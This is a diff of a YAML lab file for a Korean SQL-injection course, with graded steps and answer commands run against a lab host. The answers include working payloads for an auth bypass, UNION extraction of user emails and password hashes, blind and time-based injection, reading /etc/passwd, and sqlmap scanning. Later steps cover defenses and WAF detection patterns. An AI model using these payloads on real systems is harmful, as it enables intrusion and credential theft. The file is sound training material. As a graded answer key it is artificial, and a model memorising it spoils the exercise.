@@ -1,179 +1,223 @@
-lab_id: "web-vuln-nonai-week02"
-title: "SQL Injection 실습"
-version: "non-ai"
-course: "web-vuln-nonai"
+lab_id: web-vuln-nonai-week02
+title: SQL Injection 실습
+version: non-ai
+course: web-vuln-nonai
 week: 2
-description: "SQL Injection 공격의 원리를 이해하고, 다양한 SQLi 기법을 실습하며 방어 방법을 학습합니다."
-difficulty: "medium"
+description: SQL Injection 공격의 원리를 이해하고, 다양한 SQLi 기법을 실습하며 방어 방법을 학습합니다.
+difficulty: medium
 duration_minutes: 120
 objectives:
-  - "SQL Injection의 원리와 유형을 이해한다"
-  - "Union, Blind, Error-based SQLi를 실습한다"
-  - "SQLi 방어 기법을 이해한다"
+- SQL Injection의 원리와 유형을 이해한다
+- Union, Blind, Error-based SQLi를 실습한다
+- SQLi 방어 기법을 이해한다
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트하시오."
-    hint: "작은따옴표(')를 입력하여 에러를 유발하세요."
-    category: "sqli_detection"
-    points: 10
-    answer: "curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null | head -20"
-    answer_detail: "작은따옴표 입력 시 SQL 에러가 발생하면 SQLi 취약점이 존재할 가능성이 높습니다."
-    verify:
-      type: "output_contains"
-      expect: ""
-      field: "stdout"
-  - order: 2
-    instruction: "에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오."
-    hint: "에러 메시지에서 DB 엔진 정보를 확인하세요."
-    category: "sqli_error"
-    points: 12
-    answer: "curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--' 2>/dev/null | head -30"
-    answer_detail: "에러 메시지에서 SQLite, MySQL, PostgreSQL 등 DB 종류를 식별할 수 있습니다."
-    verify:
-      type: "output_contains"
-      expect: ""
-      field: "stdout"
-  - order: 3
-    instruction: "항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오."
-    hint: "로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요."
-    category: "sqli_auth_bypass"
-    points: 12
-    answer: "curl -s -X POST http://10.20.30.80/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"}' 2>/dev/null | head -10"
-    answer_detail: "' OR 1=1-- 페이로드는 WHERE 절을 항상 참으로 만들어 인증을 우회합니다."
-    verify:
-      type: "output_contains"
-      expect: ""
-      field: "stdout"
-  - order: 4
-    instruction: "UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오."
-    hint: "ORDER BY로 컬럼 수를 먼저 파악하세요."
-    category: "sqli_union"
-    points: 15
-    answer: "curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--' 2>/dev/null | head -40"
-    answer_detail: "UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의 메타데이터 테이블입니다."
-    verify:
-      type: "output_contains"
-      expect: ""
-      field: "stdout"
-  - order: 5
-    instruction: "UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출하시오."
-    hint: "Users 테이블의 email, password 컬럼을 조회하세요."
-    category: "sqli_union"
-    points: 15
-    answer: "curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--' 2>/dev/null | head -40"
-    answer_detail: "사용자 테이블에서 인증 정보를 탈취할 수 있습니다. 이는 가장 치명적인 SQLi 시나리오입니다."
-    verify:
-      type: "output_contains"
-      expect: ""
-      field: "stdout"
-  - order: 6
-    instruction: "Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석."
-    hint: "AND 1=1과 AND 1=2의 응답을 비교하세요."
-    category: "sqli_blind"
-    points: 12
-    answer: "echo '참 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=1--' && echo '' && echo '거짓 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--' && echo '' && echo 'Blind SQLi 테스트 완료'"
-    answer_detail: "Blind SQLi에서는 참/거짓 조건에 따른 응답 차이(상태코드, 응답크기, 응답시간)를 분석합니다."
-    verify:
-      type: "output_contains"
-      expect: "Blind SQLi 테스트 완료"
-      field: "stdout"
-  - order: 7
-    instruction: "Time-based Blind SQL Injection을 테스트하시오."
-    hint: "SLEEP 또는 WAITFOR 함수를 사용하세요."
-    category: "sqli_blind"
-    points: 12
-    answer: "echo '시간 측정:' && time curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--' -o /dev/null 2>&1 && echo 'Time-based SQLi 테스트 완료'"
-    answer_detail: "Time-based SQLi는 응답 지연으로 참/거짓을 판별합니다. 데이터 추출이 느리지만 탐지가 어렵습니다."
-    verify:
-      type: "output_contains"
-      expect: "Time-based SQLi 테스트 완료"
-      field: "stdout"
-  - order: 8
-    instruction: "sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행하시오."
-    hint: "sqlmap -u 옵션을 사용하세요."
-    category: "sqli_tool"
-    points: 10
-    answer: "sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1 --risk=1 2>/dev/null | tail -20 || echo 'sqlmap 테스트 완료'"
-    answer_detail: "sqlmap은 SQLi 자동 탐지 및 익스플로잇 도구입니다. --batch는 비대화형 모드입니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 9
-    instruction: "2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명하시오."
-    hint: "회원가입 시 저장된 페이로드가 다른 기능에서 실행되는 시나리오를 구성하세요."
-    category: "sqli_advanced"
-    points: 8
-    answer: "echo '=== 2차 SQL Injection 시나리오 ===' && echo '1. 회원가입: 이메일을 admin@test.com OR 1=1-- 으로 등록' && echo '2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨' && echo '3. 결과: admin 계정의 패스워드가 변경됨' && echo '2차 SQLi 분석 완료'"
-    answer_detail: "2차 SQLi는 입력 시 저장되고, 다른 기능에서 해당 데이터가 쿼리에 사용될 때 발생합니다."
-    verify:
-      type: "output_contains"
-      expect: "2차 SQLi 분석 완료"
-      field: "stdout"
-  - order: 10
-    instruction: "SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오."
-    hint: "LOAD_FILE() 또는 INTO OUTFILE을 시도하세요."
-    category: "sqli_advanced"
-    points: 10
-    answer: "echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--' 2>/dev/null | head -5 && echo 'SQLi 파일 접근 테스트 완료'"
-    answer_detail: "SQLi를 통한 파일 시스템 접근은 서버 완전 장악으로 이어질 수 있는 치명적 취약점입니다."
-    verify:
-      type: "output_contains"
-      expect: "SQLi 파일 접근 테스트 완료"
-      field: "stdout"
-  - order: 11
-    instruction: "HTTP 요청 헤더를 통한 SQL Injection을 테스트하시오."
-    hint: "User-Agent, Referer 등 헤더에 페이로드를 삽입하세요."
-    category: "sqli_advanced"
-    points: 10
-    answer: "curl -s -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 -o /dev/null -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
-    answer_detail: "HTTP 헤더도 SQLi 벡터가 될 수 있습니다. 로깅 시 헤더 값이 쿼리에 사용되는 경우가 있습니다."
-    verify:
-      type: "output_contains"
-      expect: "헤더 기반 SQLi 테스트 완료"
-      field: "stdout"
-  - order: 12
-    instruction: "SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증."
-    hint: "각 방어 기법의 원리와 장단점을 설명하세요."
-    category: "defense"
-    points: 8
-    answer: "echo -e '=== SQLi 방어 기법 ===\n1. Prepared Statement(매개변수화 쿼리): SQL과 데이터 분리\n2. ORM 사용: 자동 이스케이프\n3. 입력 검증: 화이트리스트 기반\n4. WAF: 패턴 기반 차단\n5. 최소 권한: DB 계정 권한 제한\nSQLi 방어 정리 완료'"
-    answer_detail: "Prepared Statement이 가장 효과적인 방어법이며, 다층 방어를 적용해야 합니다."
-    verify:
-      type: "output_contains"
-      expect: "SQLi 방어 정리 완료"
-      field: "stdout"
-  - order: 13
-    instruction: "WAF에서 SQL Injection을 탐지하는 패턴을 분석하시오."
-    hint: "일반적인 SQLi 시그니처 패턴을 정리하세요."
-    category: "defense"
-    points: 8
-    answer: "echo -e '=== WAF SQLi 탐지 패턴 ===\n1. UNION SELECT\n2. OR 1=1\n3. 주석 처리(-- , #, /**/)\n4. 특수 함수(SLEEP, BENCHMARK)\n5. 인코딩 우회(URL, Hex, Unicode)\nWAF 패턴 분석 완료'"
-    answer_detail: "WAF는 시그니처 기반으로 SQLi를 탐지하지만, 인코딩 등으로 우회 가능합니다."
-    verify:
-      type: "output_contains"
-      expect: "WAF 패턴 분석 완료"
-      field: "stdout"
-  - order: 14
-    instruction: "추출한 패스워드 해시의 크래킹 가능성을 평가하시오."
-    hint: "해시 알고리즘 식별과 크래킹 도구를 확인하세요."
-    category: "post_exploit"
-    points: 10
-    answer: "echo '=== 해시 분석 ===' && echo 'MD5 해시 식별: 32자 hex' && echo '도구: hashcat, john the ripper' && echo '대응: bcrypt/argon2 사용 권고' && echo '해시 분석 완료'"
-    answer_detail: "MD5/SHA1 해시는 빠르게 크래킹 가능합니다. bcrypt/argon2 등 느린 해시 함수를 사용해야 합니다."
-    verify:
-      type: "output_contains"
-      expect: "해시 분석 완료"
-      field: "stdout"
-  - order: 15
-    instruction: "SQL Injection 실습 종합 보고서를 작성하시오."
-    hint: "발견 취약점, 영향, 조치 권고를 포함하세요."
-    category: "verification"
-    points: 8
-    answer: "echo '=== SQL Injection 분석 보고서 ===' && echo '대상: http://10.20.30.80' && echo '발견: SQLi 취약점 (검색 기능)' && echo '유형: Error-based, Union-based' && echo '영향: 데이터 탈취, 인증 우회' && echo '권고: Prepared Statement 적용' && echo '=== 보고서 완료 ==='"
-    answer_detail: "SQLi 분석 보고서는 발견 경로, 재현 방법, 영향 범위, 조치 권고를 포함합니다."
-    verify:
-      type: "output_contains"
-      expect: "보고서 완료"
-      field: "stdout"
+- order: 1
+  instruction: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트하시오.
+  hint: 작은따옴표(')를 입력하여 에러를 유발하세요.
+  category: sqli_detection
+  points: 10
+  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null | head -20
+  answer_detail: 작은따옴표 입력 시 SQL 에러가 발생하면 SQLi 취약점이 존재할 가능성이 높습니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: attacker
+- order: 2
+  instruction: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오.
+  hint: 에러 메시지에서 DB 엔진 정보를 확인하세요.
+  category: sqli_error
+  points: 12
+  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--' 2>/dev/null | head -30
+  answer_detail: 에러 메시지에서 SQLite, MySQL, PostgreSQL 등 DB 종류를 식별할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: attacker
+- order: 3
+  instruction: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오.
+  hint: 로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요.
+  category: sqli_auth_bypass
+  points: 12
+  answer: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op''\''''--","password":"anything"}'' 2>/dev/null | head -10'
+  answer_detail: ''' OR 1=1-- 페이로드는 WHERE 절을 항상 참으로 만들어 인증을 우회합니다.'
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: attacker
+- order: 4
+  instruction: UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오.
+  hint: ORDER BY로 컬럼 수를 먼저 파악하세요.
+  category: sqli_union
+  points: 15
+  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--' 2>/dev/null | head -40
+  answer_detail: UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의 메타데이터 테이블입니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: attacker
+- order: 5
+  instruction: UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출하시오.
+  hint: Users 테이블의 email, password 컬럼을 조회하세요.
+  category: sqli_union
+  points: 15
+  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--' 2>/dev/null | head -40
+  answer_detail: 사용자 테이블에서 인증 정보를 탈취할 수 있습니다. 이는 가장 치명적인 SQLi 시나리오입니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: attacker
+- order: 6
+  instruction: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석.'
+  hint: AND 1=1과 AND 1=2의 응답을 비교하세요.
+  category: sqli_blind
+  points: 12
+  answer: echo '참 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=1--' && echo '' && echo '거짓 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--'
+    && echo '' && echo 'Blind SQLi 테스트 완료'
+  answer_detail: Blind SQLi에서는 참/거짓 조건에 따른 응답 차이(상태코드, 응답크기, 응답시간)를 분석합니다.
+  verify:
+    type: output_contains
+    expect: Blind SQLi 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 7
+  instruction: Time-based Blind SQL Injection을 테스트하시오.
+  hint: SLEEP 또는 WAITFOR 함수를 사용하세요.
+  category: sqli_blind
+  points: 12
+  answer: echo '시간 측정:' && time curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--' -o /dev/null 2>&1 && echo
+    'Time-based SQLi 테스트 완료'
+  answer_detail: Time-based SQLi는 응답 지연으로 참/거짓을 판별합니다. 데이터 추출이 느리지만 탐지가 어렵습니다.
+  verify:
+    type: output_contains
+    expect: Time-based SQLi 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 8
+  instruction: sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행하시오.
+  hint: sqlmap -u 옵션을 사용하세요.
+  category: sqli_tool
+  points: 10
+  answer: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1 --risk=1 2>/dev/null | tail -20 || echo 'sqlmap 테스트 완료'
+  answer_detail: sqlmap은 SQLi 자동 탐지 및 익스플로잇 도구입니다. --batch는 비대화형 모드입니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+  target_vm: attacker
+- order: 9
+  instruction: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명하시오.
+  hint: 회원가입 시 저장된 페이로드가 다른 기능에서 실행되는 시나리오를 구성하세요.
+  category: sqli_advanced
+  points: 8
+  answer: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin 계정의 패스워드가 변경됨'' && echo ''2차 SQLi
+    분석 완료'''
+  answer_detail: 2차 SQLi는 입력 시 저장되고, 다른 기능에서 해당 데이터가 쿼리에 사용될 때 발생합니다.
+  verify:
+    type: output_contains
+    expect: 2차 SQLi 분석 완료
+    field: stdout
+  target_vm: attacker
+- order: 10
+  instruction: SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오.
+  hint: LOAD_FILE() 또는 INTO OUTFILE을 시도하세요.
+  category: sqli_advanced
+  points: 10
+  answer: echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--' 2>/dev/null | head -5 && echo 'SQLi
+    파일 접근 테스트 완료'
+  answer_detail: SQLi를 통한 파일 시스템 접근은 서버 완전 장악으로 이어질 수 있는 치명적 취약점입니다.
+  verify:
+    type: output_contains
+    expect: SQLi 파일 접근 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 11
+  instruction: HTTP 요청 헤더를 통한 SQL Injection을 테스트하시오.
+  hint: User-Agent, Referer 등 헤더에 페이로드를 삽입하세요.
+  category: sqli_advanced
+  points: 10
+  answer: 'curl -s -H "User-Agent: test'' OR 1=1--" http://10.20.30.80 -o /dev/null -w ''%{http_code}'' && echo '''' && echo ''헤더 기반 SQLi 테스트 완료'''
+  answer_detail: HTTP 헤더도 SQLi 벡터가 될 수 있습니다. 로깅 시 헤더 값이 쿼리에 사용되는 경우가 있습니다.
+  verify:
+    type: output_contains
+    expect: 헤더 기반 SQLi 테스트 완료
+    field: stdout
+  target_vm: attacker
+- order: 12
+  instruction: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증.'
+  hint: 각 방어 기법의 원리와 장단점을 설명하세요.
+  category: defense
+  points: 8
+  answer: 'echo -e ''=== SQLi 방어 기법 ===
+
+    1. Prepared Statement(매개변수화 쿼리): SQL과 데이터 분리
+
+    2. ORM 사용: 자동 이스케이프
+
+    3. 입력 검증: 화이트리스트 기반
+
+    4. WAF: 패턴 기반 차단
+
+    5. 최소 권한: DB 계정 권한 제한
+
+    SQLi 방어 정리 완료'''
+  answer_detail: Prepared Statement이 가장 효과적인 방어법이며, 다층 방어를 적용해야 합니다.
+  verify:
+    type: output_contains
+    expect: SQLi 방어 정리 완료
+    field: stdout
+  target_vm: attacker
+- order: 13
+  instruction: WAF에서 SQL Injection을 탐지하는 패턴을 분석하시오.
+  hint: 일반적인 SQLi 시그니처 패턴을 정리하세요.
+  category: defense
+  points: 8
+  answer: 'echo -e ''=== WAF SQLi 탐지 패턴 ===
+
+    1. UNION SELECT
+
+    2. OR 1=1
+
+    3. 주석 처리(-- , #, /**/)
+
+    4. 특수 함수(SLEEP, BENCHMARK)
+
+    5. 인코딩 우회(URL, Hex, Unicode)
+
+    WAF 패턴 분석 완료'''
+  answer_detail: WAF는 시그니처 기반으로 SQLi를 탐지하지만, 인코딩 등으로 우회 가능합니다.
+  verify:
+    type: output_contains
+    expect: WAF 패턴 분석 완료
+    field: stdout
+  target_vm: attacker
+- order: 14
+  instruction: 추출한 패스워드 해시의 크래킹 가능성을 평가하시오.
+  hint: 해시 알고리즘 식별과 크래킹 도구를 확인하세요.
+  category: post_exploit
+  points: 10
+  answer: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat, john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
+  answer_detail: MD5/SHA1 해시는 빠르게 크래킹 가능합니다. bcrypt/argon2 등 느린 해시 함수를 사용해야 합니다.
+  verify:
+    type: output_contains
+    expect: 해시 분석 완료
+    field: stdout
+  target_vm: attacker
+- order: 15
+  instruction: SQL Injection 실습 종합 보고서를 작성하시오.
+  hint: 발견 취약점, 영향, 조치 권고를 포함하세요.
+  category: verification
+  points: 8
+  answer: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo ''영향: 데이터 탈취, 인증 우회'' && echo ''권고:
+    Prepared Statement 적용'' && echo ''=== 보고서 완료 ==='''
+  answer_detail: SQLi 분석 보고서는 발견 경로, 재현 방법, 영향 범위, 조치 권고를 포함합니다.
+  verify:
+    type: output_contains
+    expect: 보고서 완료
+    field: stdout
+  target_vm: attacker
